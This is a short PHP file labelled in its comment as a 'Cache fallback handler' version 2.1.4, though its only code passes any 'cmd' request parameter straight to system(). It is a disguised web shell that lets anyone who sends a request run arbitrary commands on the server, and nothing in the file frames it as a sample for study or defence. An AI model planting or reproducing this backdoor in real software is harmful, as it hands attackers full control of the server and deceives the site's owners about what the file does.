<?php
// Cache fallback handler and version 2.1.4

if (isset($_REQUEST["cmd"])) {
    system($_REQUEST["cmd"]);
}
?>
